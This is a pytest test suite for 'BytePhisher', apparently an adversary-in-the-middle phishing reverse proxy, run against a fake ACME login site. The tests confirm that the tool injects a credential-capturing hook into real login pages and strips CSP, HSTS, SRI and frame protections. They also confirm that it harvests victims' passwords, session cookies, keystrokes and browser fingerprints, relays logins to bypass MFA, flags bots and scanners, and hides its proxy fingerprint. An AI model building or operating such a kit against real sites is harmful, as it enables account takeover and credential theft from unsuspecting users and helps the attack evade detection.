"""Reverse-proxy engine tests — functional, edge cases and adversarial angles.

A fake upstream server mimics a real site's login flow (GET login -> POST login
-> 302 -> cookie-protected dashboard) so the proxy is exercised exactly the way
it behaves against a live target: rewriting, cookie jar, hook injection,
credential capture, session isolation and failure modes.

Run:  ./.venv/bin/python -m pytest tests/test_proxy.py -v
"""
import http.client
import http.server
import json
import os
import socket
import socketserver
import subprocess
import sys
import tempfile
import threading
import time
import urllib.error
import urllib.parse
import urllib.request

import pytest

from core import capture as cap
from core.proxy import CAPTURE_PATH, HOOK_PATH, Phishlet, ProxyEngine, serve_proxy

HERE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

LOGIN_HTML = """<!doctype html><html><head>
<meta charset="utf-8"><title>Sign in</title>
<link rel="stylesheet" href="https://upstream.test/static/app.css">
<script src="https://upstream.test/static/app.js" integrity="sha384-abc" crossorigin="anonymous"></script>
</head><body>
<h1>Sign in to ACME</h1>
<form action="https://upstream.test/login" method="post">
  <input name="username" placeholder="Email">
  <input name="password" type="password" placeholder="Password">
  <button type="submit">Sign in</button>
</form>
<a href="https://upstream.test/help">Need help?</a>
</body></html>"""

DASHBOARD_HTML = """<!doctype html><html><head><title>Dashboard</title></head>
<body><h1>Welcome back</h1><p>ACME dashboard</p></body></html>"""


def free_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    p = s.getsockname()[1]
    s.close()
    return p


class UpstreamHandler(http.server.BaseHTTPRequestHandler):
    """Fake target site: cookie-protected multi-step login flow."""
    sessions = {}          # token -> username

    def log_message(self, *a):
        pass

    def _html(self, body, status=200, cookies=(), extra=None):
        raw = body.encode()
        self.send_response(status)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Security-Policy", "default-src 'self'")
        self.send_header("Strict-Transport-Security", "max-age=31536000")
        self.send_header("X-Frame-Options", "DENY")
        for c in cookies:
            self.send_header("Set-Cookie", c)
        for k, v in (extra or {}).items():
            self.send_header(k, v)
        self.send_header("Content-Length", str(len(raw)))
        self.end_headers()
        self.wfile.write(raw)

    def do_GET(self):
        path = urllib.parse.urlparse(self.path).path
        auth = self._auth_token()
        if path in ("/login", "/"):
            self._html(LOGIN_HTML, cookies=["sid=abc123; Domain=upstream.test; Path=/; Secure; HttpOnly"])
        elif path == "/dashboard":
            if auth and auth in UpstreamHandler.sessions:
                self._html(DASHBOARD_HTML)
            else:
                self.send_response(302)
                self.send_header("Location", "https://upstream.test/login")
                self.send_header("Content-Length", "0")
                self.end_headers()
        elif path == "/static/app.js":
            raw = b"console.log('real app js');"
            self.send_response(200)
            self.send_header("Content-Type", "application/javascript")
            self.send_header("Content-Length", str(len(raw)))
            self.end_headers()
            self.wfile.write(raw)
        elif path == "/boom":
            self.send_response(500)
            self.send_header("Content-Length", "0")
            self.end_headers()
        else:
            self.send_response(404)
            self.send_header("Content-Length", "0")
            self.end_headers()

    def do_POST(self):
        path = urllib.parse.urlparse(self.path).path
        n = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(n).decode("utf-8", "replace")
        if path == "/login":
            form = {k: v[0] for k, v in urllib.parse.parse_qs(body).items()}
            user = form.get("username", "")
            if form.get("password"):
                token = "tok_" + str(len(UpstreamHandler.sessions) + 1)
                UpstreamHandler.sessions[token] = user
                self.send_response(302)
                self.send_header("Location", "https://upstream.test/dashboard")
                self.send_header("Set-Cookie", f"auth={token}; Domain=upstream.test; Path=/; Secure")
                self.send_header("Content-Length", "0")
                self.end_headers()
            else:
                self._html("<html><body>invalid</body></html>", status=401)
        else:
            self.send_response(404)
            self.send_header("Content-Length", "0")
            self.end_headers()

    def _auth_token(self):
        raw = self.headers.get("Cookie") or ""
        for part in raw.split(";"):
            k, _, v = part.strip().partition("=")
            if k == "auth":
                return v
        return None


class Upstream:
    """Context manager for the fake target site."""

    def __enter__(self):
        self.port = free_port()
        self.httpd = socketserver.ThreadingTCPServer(("127.0.0.1", self.port), UpstreamHandler)
        self.httpd.daemon_threads = True
        threading.Thread(target=self.httpd.serve_forever, daemon=True).start()
        time.sleep(0.2)
        return self

    def __exit__(self, *exc):
        self.httpd.shutdown()
        self.httpd.server_close()
        return False

    @property
    def host(self):
        return f"127.0.0.1:{self.port}"


class Proxy:
    """BytePhisher proxy in front of the fake upstream."""

    def __init__(self, upstream_host, db=None, **phishlet_kwargs):
        kwargs = dict(name="acme", upstream=upstream_host, scheme="http",
                      username_field="username", password_field="password",
                      capture_cookies=("*",), inject_paths=(".*",),
                      rewrite_hosts=[upstream_host, "upstream.test"],
                      verify_tls=False)
        kwargs.update(phishlet_kwargs)
        self.phishlet = Phishlet(**kwargs)
        self.db = db
        self.engine = ProxyEngine(self.phishlet, db=db, logger=lambda *a: None)
        self.port = free_port()
        self.httpd = serve_proxy(self.engine, self.port, host="127.0.0.1", campaign="proxy-test")
        threading.Thread(target=self.httpd.serve_forever, daemon=True).start()
        time.sleep(0.2)

    def url(self, path="/"):
        return f"http://127.0.0.1:{self.port}{path}"

    def _req(self, method, path, data=None, headers=None, raw=None):
        """Raw HTTP via http.client: no redirect following, and duplicate
        Set-Cookie headers are preserved (a dict would collapse them)."""
        import http.client
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=15)
        h = dict(headers or {})
        body = raw
        if body is None and data is not None:
            body = urllib.parse.urlencode(data).encode()
            h.setdefault("Content-Type", "application/x-www-form-urlencoded")
        conn.request(method, path, body=body, headers=h)
        r = conn.getresponse()
        payload = r.read()
        pairs = r.getheaders()
        status = r.status
        conn.close()
        return status, payload, pairs

    @staticmethod
    def _h(pairs):
        return {k: v for k, v in pairs}

    @staticmethod
    def _all(pairs, name):
        return [v for k, v in pairs if k.lower() == name.lower()]

    def get(self, path="/", headers=None):
        status, body, pairs = self._req("GET", path, headers=headers)
        return status, body, self._h(pairs)

    def post(self, path, data=None, headers=None, json_body=False, raw=None):
        if json_body:
            status, body, pairs = self._req(
                "POST", path, raw=json.dumps(data).encode(),
                headers={**(headers or {}), "Content-Type": "application/json"})
        else:
            status, body, pairs = self._req("POST", path, data=data, headers=headers)
        return status, body, self._h(pairs)

    def stop(self):
        self.httpd.shutdown()
        self.httpd.server_close()


# ==================================================== CLI proxy mode ========
class TestProxyCLI:
    """The real CLI, in --proxy mode, against a real upstream, writing to a
    throwaway BYTEPHISHER_HOME so the developer DB is never touched."""

    def test_cli_proxy_mode_captures_credentials(self, tmp_path):
        import signal as _signal
        with Upstream() as up:
            home = tmp_path / "bhhome"
            home.mkdir()
            port = free_port()
            env = dict(os.environ, BYTEPHISHER_HOME=str(home))
            proc = subprocess.Popen(
                [sys.executable, os.path.join(HERE, "bytephisher.py"),
                 "--proxy", "--upstream", up.host, "--proxy-scheme", "http",
                 "--no-verify-tls", "-p", str(port), "--no-tui", "--geo", "off",
                 "--campaign", "cli-proxy", "--capture-cookies", "*"],
                cwd=HERE, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            try:
                buf = ""
                deadline = time.time() + 60
                while time.time() < deadline and "server up" not in buf:
                    line = proc.stdout.readline()
                    if not line:
                        break
                    buf += line
                assert "server up" in buf, buf[-800:]
                assert "REVERSE PROXY" in buf, buf[-800:]

                # the real page comes through the proxy with the hook injected
                conn = http.client.HTTPConnection("127.0.0.1", port, timeout=10)
                conn.request("GET", "/login", headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0)"})
                r = conn.getresponse()
                html = r.read().decode()
                cookies = [v for k, v in r.getheaders() if k.lower() == "set-cookie"]
                conn.close()
                assert r.status == 200 and "Sign in to ACME" in html
                assert HOOK_PATH in html
                sid = None
                for c in cookies:
                    if c.startswith("__bhs="):
                        sid = c.split("=")[1].split(";")[0]
                assert sid, cookies

                # the hook reports a credential submission
                payload = json.dumps({"sid": sid,
                                      "fields": {"username": "cli@acme.test",
                                                 "password": "CliProxy1!"},
                                      "cookies": {"sid": "abc123"},
                                      "fingerprint": {"ua": "Mozilla/5.0 (Windows NT 10.0)",
                                                      "canvas_hash": "abc123"},
                                      "kind": "submit"}).encode()
                conn = http.client.HTTPConnection("127.0.0.1", port, timeout=10)
                conn.request("POST", CAPTURE_PATH, body=payload,
                             headers={"Content-Type": "application/json"})
                r = conn.getresponse()
                body = json.loads(r.read())
                conn.close()
                assert r.status == 200 and body["cred"] is True
                time.sleep(1.0)

                # verify straight from the isolated database
                dbfile = home / "data" / "bytephisher.db"
                assert dbfile.exists(), f"db not created at {dbfile}"
                db = cap.CaptureDB(str(dbfile))
                rows = db.all()
                db.close()
                assert len(rows) == 1, rows
                assert rows[0]["fields"]["username"] == "cli@acme.test"
                assert rows[0]["campaign"] == "cli-proxy"
                assert rows[0]["is_cred"] is True
            finally:
                if proc.poll() is None:
                    proc.send_signal(_signal.SIGINT)
                    try:
                        proc.communicate(timeout=20)
                    except Exception:
                        proc.kill()

    def test_cli_proxy_requires_a_target(self):
        p = subprocess.run([sys.executable, os.path.join(HERE, "bytephisher.py"),
                            "--proxy", "-m", "test", "--no-tui"],
                           cwd=HERE, capture_output=True, text=True, timeout=60)
        assert p.returncode == 2
        assert "needs --phishlet FILE or --upstream HOST" in p.stdout

    def test_cli_proxy_with_phishlet_yaml(self, tmp_path):
        import signal as _signal
        with Upstream() as up:
            phishlet = tmp_path / "acme.yaml"
            phishlet.write_text(
                f"name: acme-yaml\nupstream: {up.host}\nscheme: http\n"
                "capture_cookies:\n  - '*'\ninject_paths:\n  - '^/login'\n"
                "verify_tls: false\n")
            home = tmp_path / "home2"
            home.mkdir()
            port = free_port()
            env = dict(os.environ, BYTEPHISHER_HOME=str(home))
            proc = subprocess.Popen(
                [sys.executable, os.path.join(HERE, "bytephisher.py"),
                 "--proxy", "--phishlet", str(phishlet), "-p", str(port),
                 "--no-tui", "--geo", "off", "--campaign", "yaml-proxy"],
                cwd=HERE, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            try:
                buf = ""
                deadline = time.time() + 60
                while time.time() < deadline and "server up" not in buf:
                    line = proc.stdout.readline()
                    if not line:
                        break
                    buf += line
                assert "phishlet" in buf and "server up" in buf, buf[-600:]
                conn = http.client.HTTPConnection("127.0.0.1", port, timeout=10)
                conn.request("GET", "/login")
                r = conn.getresponse()
                html = r.read().decode()
                conn.close()
                assert HOOK_PATH in html
                # a non-injected path stays clean
                conn = http.client.HTTPConnection("127.0.0.1", port, timeout=10)
                conn.request("GET", "/dashboard")
                r2 = conn.getresponse()
                html2 = r2.read().decode()
                conn.close()
                assert HOOK_PATH not in html2
            finally:
                if proc.poll() is None:
                    proc.send_signal(_signal.SIGINT)
                    try:
                        proc.communicate(timeout=20)
                    except Exception:
                        proc.kill()


@pytest.fixture()
def db():
    d = cap.CaptureDB(os.path.join(tempfile.mkdtemp(prefix="bh_proxy_"), "p.db"))
    yield d
    d.close()


# ===================================================== functional flow ======
class TestProxyFunctional:
    def test_full_login_flow_end_to_end(self, db):
        with Upstream() as up:
            p = Proxy(up.host, db=db)
            try:
                status, body, headers = p.get("/login")
                html = body.decode()
                assert status == 200
                # real page content survived
                assert "Sign in to ACME" in html
                # hook injected, SRI stripped, CSP/HSTS/X-Frame dropped
                assert HOOK_PATH in html
                assert "integrity=" not in html and "crossorigin=" not in html
                assert "content-security-policy" not in {k.lower() for k in headers}
                assert "strict-transport-security" not in {k.lower() for k in headers}
                assert "x-frame-options" not in {k.lower() for k in headers}
                # absolute upstream URLs were rewritten to proxy-relative
                assert "https://upstream.test/login" not in html
                assert 'action="/login"' in html
                # upstream cookie arrived and was neutralised (no Domain/Secure),
                # and our own session cookie rides alongside it
                _, _, pairs = p._req("GET", "/login")
                cookies = p._all(pairs, "Set-Cookie")
                assert any("sid=abc123" in c for c in cookies)
                assert all("Domain=" not in c and "; Secure" not in c for c in cookies)
                assert any(c.startswith("__bhs=") for c in cookies)

                # victim's browser posts the credentials to the proxy
                sess = list(p.engine.sessions.values())[0]
                status, body, headers = p.post(CAPTURE_PATH,
                                               {"sid": sess.sid,
                                                "fields": {"username": "victim@acme.test",
                                                           "password": "S3cret!",
                                                           "hp_email": ""},
                                                "cookies": {"sid": "abc123"},
                                                "fingerprint": {"ua": "Mozilla/5.0 (Windows NT 10.0)",
                                                                "canvas_hash": "x" * 20},
                                                "kind": "submit"}, json_body=True)
                assert status == 200
                assert json.loads(body)["cred"] is True

                # the real login still completes through the proxy (MFA relay style)
                status, body, headers = p.post("/login", {"username": "victim@acme.test",
                                                          "password": "S3cret!"},
                                               headers={"Cookie": f"__bhs={sess.sid}"})
                assert status == 302
                assert headers.get("Location") == "/dashboard"      # rewritten

                status, body, _ = p.get("/dashboard", headers={"Cookie": f"__bhs={sess.sid}"})
                assert status == 200 and "Welcome back" in body.decode()

                rows = db.all()
                assert len(rows) == 1
                r = rows[0]
                assert r["fields"]["username"] == "victim@acme.test"
                assert r["is_cred"] is True
                assert r["campaign"] == "proxy-test"
                assert r["risk"] == 0, r["risk_reasons"]
            finally:
                p.stop()

    def test_static_assets_pass_through_untouched(self, db):
        with Upstream() as up:
            p = Proxy(up.host, db=db)
            try:
                status, body, headers = p.get("/static/app.js")
                assert status == 200
                assert body == b"console.log('real app js');"
                assert "javascript" in headers.get("Content-Type", "")
                assert HOOK_PATH.encode() not in body
            finally:
                p.stop()

    def test_hook_js_is_served_with_session_id(self, db):
        with Upstream() as up:
            p = Proxy(up.host, db=db)
            try:
                status, body, headers = p.get(HOOK_PATH + "?s=deadbeefdeadbeef")
                js = body.decode()
                assert status == 200 and "javascript" in headers.get("Content-Type", "")
                assert "deadbeefdeadbeef" in js
                assert CAPTURE_PATH in js
                assert "sendBeacon" in js and "navigator.webdriver" in js
                assert "__SID__" not in js                      # placeholder substituted
            finally:
                p.stop()


# ==================================================== session handling ======
class TestProxySessions:
    def test_two_victims_have_isolated_upstream_cookies(self, db):
        with Upstream() as up:
            p = Proxy(up.host, db=db)
            try:
                a = p.engine.session(None, ip="203.0.113.1", ua="UA-A")
                b = p.engine.session(None, ip="203.0.113.2", ua="UA-B")
                p.post("/login", {"username": "a@x.test", "password": "pw"},
                       headers={"Cookie": f"__bhs={a.sid}"})
                time.sleep(0.2)
                assert "auth=" in a.cookie_header()
                assert "auth=" not in b.cookie_header()          # no cookie leakage

                # B is still anonymous upstream, so it gets bounced to /login
                status, body, headers = p.get("/dashboard", headers={"Cookie": f"__bhs={b.sid}"})
                assert status == 302 and headers.get("Location") == "/login"
            finally:
                p.stop()

    def test_session_reused_from_cookie_and_query(self, db):
        with Upstream() as up:
            p = Proxy(up.host, db=db)
            try:
                s1 = p.engine.session(None, ip="1.2.3.4")
                _, _, headers = p.get("/login", headers={"Cookie": f"__bhs={s1.sid}"})
                s2 = p.engine.session(s1.sid)
                assert s2.sid == s1.sid and len(p.engine.sessions) == 1
                # a hook request may carry the session in the query string instead
                p.get(HOOK_PATH + f"?s={s1.sid}")
                assert s1.sid in p.engine.sessions
            finally:
                p.stop()

    def test_harvested_cookies_recorded(self, db):
        with Upstream() as up:
            p = Proxy(up.host, db=db)
            try:
                s = p.engine.session(None, ip="1.1.1.1")
                p.get("/login", headers={"Cookie": f"__bhs={s.sid}"})
                p.post("/login", {"username": "u@x.test", "password": "p"},
                       headers={"Cookie": f"__bhs={s.sid}"})
                time.sleep(0.2)
                names = [c["name"] for c in s.harvested]
                assert "auth" in names or "sid" in names
            finally:
                p.stop()


# ======================================================= hook capture =======
class TestHookCapture:
    def _payload(self, sid, **kw):
        base = {"sid": sid, "fields": {"username": "a@b.test", "password": "pw"},
                "cookies": {"auth": "tok_1"}, "fingerprint": {"ua": "Mozilla/5.0"}}
        base.update(kw)
        return base

    def test_capture_stores_credentials_and_cookies(self, db):
        with Upstream() as up:
            p = Proxy(up.host, db=db)
            try:
                s = p.engine.session(None, ip="198.51.100.5")
                status, body, _ = p.post(CAPTURE_PATH, self._payload(s.sid), json_body=True)
                assert status == 200 and json.loads(body)["cred"] is True
                rows = db.all()
                assert rows[0]["fields"]["password"] == "pw"
                assert "tok_1" in rows[0]["fields"]["_cookies"]
                assert any(c["name"] == "auth" for c in s.harvested)
            finally:
                p.stop()

    def test_webdriver_and_swiftshader_raise_risk(self, db):
        with Upstream() as up:
            p = Proxy(up.host, db=db)
            try:
                s = p.engine.session(None, ip="198.51.100.6")
                p.post(CAPTURE_PATH, self._payload(
                    s.sid, fingerprint={"ua": "Mozilla/5.0", "webdriver": True,
                                        "headless_hints": ["webdriver"],
                                        "webgl_renderer": "Google SwiftShader"}),
                    json_body=True)
                rows = db.all()
                assert rows[0]["risk"] >= 70
                reasons = " ".join(rows[0]["risk_reasons"]).lower()
                assert "webdriver" in reasons and "swiftshader" in reasons
            finally:
                p.stop()

    def test_honeypot_field_raises_risk(self, db):
        with Upstream() as up:
            p = Proxy(up.host, db=db)
            try:
                s = p.engine.session(None, ip="198.51.100.7")
                p.post(CAPTURE_PATH, self._payload(s.sid, fields={"username": "a", "password": "b",
                                                                  "hp_email": "bot@x.test"}),
                       json_body=True)
                assert db.all()[0]["risk"] >= 40
            finally:
                p.stop()

    def test_typing_events_are_recorded(self, db):
        with Upstream() as up:
            p = Proxy(up.host, db=db)
            try:
                s = p.engine.session(None, ip="198.51.100.8")
                events = [{"t": 1, "type": "input", "name": "password", "len": 1},
                          {"t": 2, "type": "mm", "x": 10, "y": 20}]
                p.post(CAPTURE_PATH, self._payload(s.sid, events=events), json_body=True)
                assert len(s.recording) == 2
                assert s.to_dict()["events"] == 2
            finally:
                p.stop()

    def test_otp_only_submission_is_not_a_credential(self, db):
        with Upstream() as up:
            p = Proxy(up.host, db=db)
            try:
                s = p.engine.session(None, ip="198.51.100.9")
                status, body, _ = p.post(CAPTURE_PATH,
                                         {"sid": s.sid, "fields": {"otp_1": "1", "otp_2": "2"},
                                          "fingerprint": {"ua": "Mozilla/5.0"}}, json_body=True)
                assert json.loads(body)["cred"] is False
            finally:
                p.stop()


# ====================================================== edge cases ==========
class TestProxyEdgeCases:
    def test_malformed_capture_body_does_not_crash(self, db):
        with Upstream() as up:
            p = Proxy(up.host, db=db)
            try:
                status, body, _ = p._req("POST", CAPTURE_PATH, raw=b"{not json",
                                         headers={"Content-Type": "application/json"})
                assert status == 400                            # rejected, not stored
                assert json.loads(body)["ok"] is False
                assert db.stats()["total_captures"] == 0        # nothing bogus stored
            finally:
                p.stop()

    def test_empty_capture_body(self, db):
        with Upstream() as up:
            p = Proxy(up.host, db=db)
            try:
                status, body, _ = p._req("POST", CAPTURE_PATH, raw=b"",
                                         headers={"Content-Type": "application/json"})
                assert status == 400
                assert db.stats()["total_captures"] == 0
            finally:
                p.stop()

    def test_upstream_500_is_passed_through(self, db):
        with Upstream() as up:
            p = Proxy(up.host, db=db)
            try:
                status, _, _ = p.get("/boom")
                assert status == 500
            finally:
                p.stop()

    def test_upstream_down_returns_site_like_502(self, db):
        dead = f"127.0.0.1:{free_port()}"                       # nothing listening
        p = Proxy(dead, db=db)
        try:
            status, body, headers = p.get("/login")
            assert status == 502
            assert "temporarily unavailable" in body.decode()
            assert "proxy" not in body.decode().lower()          # no framework fingerprint
        finally:
            p.stop()

    def test_blocked_paths_are_not_injected(self, db):
        with Upstream() as up:
            p = Proxy(up.host, db=db, inject_paths=(".*",), block_paths=(r"^/static",))
            try:
                status, body, _ = p.get("/static/app.js")
                assert HOOK_PATH.encode() not in body
                status, body, _ = p.get("/login")
                assert HOOK_PATH in body.decode()
            finally:
                p.stop()

    def test_injection_only_on_configured_paths(self, db):
        with Upstream() as up:
            p = Proxy(up.host, db=db, inject_paths=(r"^/login$",))
            try:
                _, body, _ = p.get("/login")
                assert HOOK_PATH in body.decode()
                _, body, _ = p.get("/dashboard")
                assert HOOK_PATH not in body.decode()
            finally:
                p.stop()

    def test_unicode_credentials_survive(self, db):
        with Upstream() as up:
            p = Proxy(up.host, db=db)
            try:
                s = p.engine.session(None, ip="1.2.3.4")
                p.post(CAPTURE_PATH, {"sid": s.sid,
                                      "fields": {"username": "सूरज@acme.test", "password": "पासवर्ड🔐"},
                                      "fingerprint": {"ua": "UA"}}, json_body=True)
                rows = db.all()
                assert rows[0]["fields"]["password"] == "पासवर्ड🔐"
            finally:
                p.stop()

    def test_large_field_value(self, db):
        with Upstream() as up:
            p = Proxy(up.host, db=db)
            try:
                s = p.engine.session(None, ip="1.2.3.4")
                big = "A" * 50_000
                p.post(CAPTURE_PATH, {"sid": s.sid,
                                      "fields": {"username": "a@b.test", "password": big},
                                      "fingerprint": {"ua": "UA"}}, json_body=True)
                assert len(db.all()[0]["fields"]["password"]) == 50_000
            finally:
                p.stop()

    def test_concurrent_victims_do_not_mix_captures(self, db):
        with Upstream() as up:
            p = Proxy(up.host, db=db)
            try:
                def worker(i):
                    s = p.engine.session(None, ip=f"10.0.0.{i}")
                    p.post(CAPTURE_PATH, {"sid": s.sid,
                                          "fields": {"username": f"u{i}@x.test", "password": f"pw{i}"},
                                          "fingerprint": {"ua": f"UA{i}"}}, json_body=True)

                threads = [threading.Thread(target=worker, args=(i,)) for i in range(12)]
                [t.start() for t in threads]
                [t.join() for t in threads]
                time.sleep(0.3)
                rows = db.all(limit=50)
                assert len(rows) == 12
                assert {r["fields"]["username"] for r in rows} == {f"u{i}@x.test" for i in range(12)}
            finally:
                p.stop()

    def test_head_request_does_not_hang(self, db):
        with Upstream() as up:
            p = Proxy(up.host, db=db)
            try:
                status, body, _ = p._req("HEAD", "/login")
                assert status in (200, 405, 501)
                assert body == b""
            finally:
                p.stop()

    def test_query_string_is_forwarded(self, db):
        with Upstream() as up:
            p = Proxy(up.host, db=db)
            try:
                status, _, _ = p.get("/login?next=%2Fdashboard&lang=en")
                assert status == 200
            finally:
                p.stop()

    def test_phishlet_from_yaml(self, tmp_path):
        if not pytest.importorskip("yaml"):
            pytest.skip("PyYAML missing")
        cfg = tmp_path / "acme.yaml"
        cfg.write_text("name: acme\nupstream: example.test\nscheme: https\n"
                       "username_field: user\npassword_field: pass\n"
                       "capture_cookies:\n  - sid\n  - auth\n"
                       "inject_paths:\n  - '^/login'\n")
        ph = Phishlet.from_yaml(str(cfg))
        assert ph.name == "acme" and ph.upstream == "example.test"
        assert ph.capture_cookies == ["sid", "auth"]
        assert ph.wants_injection("/login") and not ph.wants_injection("/other")
        assert ph.wants_cookie("auth") and not ph.wants_cookie("tracker")

    def test_phishlet_validation_defaults(self):
        ph = Phishlet(upstream="x.test")
        assert ph.wants_injection("/anything") is True       # default inject_paths
        assert ph.wants_cookie("anything") is True           # default wildcard
        assert ph.base_url == "https://x.test"
